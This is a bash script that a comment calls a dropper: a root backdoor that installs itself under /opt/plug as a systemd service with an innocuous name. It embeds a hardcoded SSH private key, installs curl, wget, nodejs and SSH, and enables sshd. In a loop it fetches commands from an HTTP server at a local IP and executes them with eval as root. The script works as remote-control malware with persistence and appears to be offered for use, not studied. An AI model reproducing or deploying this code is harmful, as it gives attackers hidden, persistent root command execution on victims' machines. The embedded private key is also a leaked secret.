#!/bin/bash

TARGET=/opt/plug

#echo 'running the dropper...'

echo "processID=$$"
#echo "$?"
#echo "command=$0"
#echo "workingDirectory=$(pwd)"
#echo "executablePath=$(pwd)/$0"

#execPath="$(pwd)/$0"

shared_rsa_pub="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjxs21qxpLgbQaFl+/ZwAAQG+pW4Tl40ZA2g1ZZxgtO5yOnPt0ESRTV5/4q5D0dqG81YGhZq7MKh0ym9PCF8PXApcNV000eW168t1yygPc/k5ulEYyKfQB+F+RUBEabT2HtYPEvRt2KEi/j4qR03Ippv/cNfPoBizIccUnEXdnQeqQeypeQwjqhhNQyKD5+3VjTnu+8a1KVXhO5p/mDI0233S3wsR1CITE0dymmqdpxM5UfdIguZ+amaRV+4Ozj4lXtuEI+gBX6aOb2yIkG+bKHxfDewQnBuW/gpb0gfDIQn+X/hz6jdBhsw35gLFxXJAuZudqUYlxSjZjBHtFOSsecazg5PZ58JCaO/dw4pZiSekv2hr117+DghFEhekW707ttAloW9R+SvL3ct9orJQW5X+vrgif5dQV83VqBjmtPbsuqaew6TZZvyktToXUCpp6ELTSUk/j/S5F1MTrO1AAD8nj3+9TxPn/LNAOn1TBdCHuHCiH6rZOITfPR5sgA5k= autossh@0x3e"
shared_rsa="-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
"

plug_install() {
    # check if `running as root
    if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    exit 1
    fi

    # check TARGET dir
    if [ ! -d $TARGET ]; then
        mkdir -v $TARGET
    fi

    cp -v $0 $TARGET/main.sh
    chmod +x $TARGET/main.sh

    if [ -d /etc/systemd ]; then
        if [ -f /etc/systemd/system/plug.service ]; then
            systemctl stop plug
        fi

        echo "[Unit]
Description=TPservice
#Documentation=man:sshd(8) man:sshd_config(5)
#After=network.target auditd.service
#ConditionPathExists=!/etc/ssh/sshd_not_to_be_run

[Service]
User=root
#EnvironmentFile=-/etc/default/ssh
#ExecStartPre=/usr/sbin/sshd -t
ExecStart=/opt/plug/main.sh daemon
#ExecReload=/usr/sbin/sshd -t
#ExecReload=/bin/kill -HUP $MAINPID
#KillMode=process
#Restart=on-failure
#RestartPreventExitStatus=255
#Type=notify
#RuntimeDirectory=sshd
#RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
#Alias=sshd.service" > /etc/systemd/system/plug.service

        systemctl daemon-reload
        systemctl enable plug
        systemctl restart plug
    fi
}

plug_postinstall() {
    pkgs="curl wget nodejs"

    function AptInstall {
        if ! dpkg -s $pkgs >/dev/null 2>&1; then
        apt-get install $pkgs -y
        fi
    }

    if [ -x "$(command -v apk)" ];       then apk add --no-cache $pkgs
    elif [ -x "$(command -v apt-get)" ]; then apt-get install $pkgs openssh-client openssh-server -y
    # - elif [ -x "$(command -v apt-get)" ]; then apt-get install $pkgs a
    elif [ -x "$(command -v pacman)" ]; then 
        pacman -Sy --noconfirm $pkgs openssh nodejs autossh 2>&1 /dev/null
    elif [ -x "$(command -v zypper)" ];  then zypper install $pkgs
    else echo "FAILED TO INSTALL PACKAGE: Package manager not found. You must manually install: $pkgs">&2; fi


    # enableing ssh server
    #systemctl restart sshd
    #
    if [ -f /etc/systemd/system/sshd.service ]; then
        systemctl enable sshd
        systemctl restart sshd
    fi

    #useradd -r -M -d /opt/plug/ plug

    #chown -R plug.plug $TARGET
    #chmod 0700 $TARGET/ssh
    #chmod 0600 $TARGET/ssh/authorized_keys

    if [ ! -d $TARGET/ssh ]; then
        mkdir $TARGET/ssh
    fi

    if [ ! -f $TARGET/ssh/id_rsa ]; then
        #-u plug ssh-keygen -f /opt/plug/ssh/id_rsa -t rsa -N ''
        ssh-keygen -f /opt/plug/ssh/id_rsa -t rsa -N '' &> /dev/null
    fi

    if [ ! -f /opt/plug/hostid ]; then
        #hostid=$(sha256sum /etc/ssh/ssh_host_rsa_key.pub | awk '{print $1}')
        hostid=$(md5sum /opt/plug/ssh/id_rsa.pub | awk '{print $1}')
        #echo $hostid
        echo $hostid | tee /opt/plug/hostid
    fi

    ln -s $TARGET/ssh $TARGET/.ssh
}

plug_init() {
    continue=TRUE
    interval=4

    transport=TRUE
    transportInterval=45
    transportLast=""

    hostid=""

    PEER=plug@localhost

    #echo "initialized"
	#echo $(pwd)

	if [ ! -f /opt/plug/hostid ]; then
		#. /opt/plug/postinstall.sh
        plug_postinstall
	fi

	hostid=$(cat /opt/plug/hostid)
    echo "hostid=$hostid"
}
plug_loop() {
    while [ $continue ]; do
		echo "loop"

		#source "config"

		#work=$(echo $hostid | ssh -T $PEER -i /opt/plug/ssh/shared_rsa)
		work=$(curl -s -X GET -G "http://192.168.1.148:3000" -d "hostid=$hostid") 
        echo "work=$work"
		eval $work

        #echo "$(pwd)"
        #echo "$0"

		echo "sleeping for $interval"
		sleep $interval
	done
}

plug_purge() {
    echo "purgeing"
    if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    exit 1
    fi

    systemctl stop plug
    systemctl disable plug

    rm -v -rf $TARGET

    echo 'done purgeing, exiting now'
    exit
}

if [ $1 ]; then
    subcommand=$1
    case $subcommand in
        "" | "-h" | "--help")
            sub_help
            ;;
        "purge") plug_purge;;
        "daemon") 
            plug_init
            plug_loop
        ;;
        "install") plug_install;;
        *) echo 'error subcommand failed';;
    esac
else
    plug_install
fi

# if [ ! -d $TARGET ]; then
#     plug_install
#     #exit
# fi

#plug_init
#plug_loop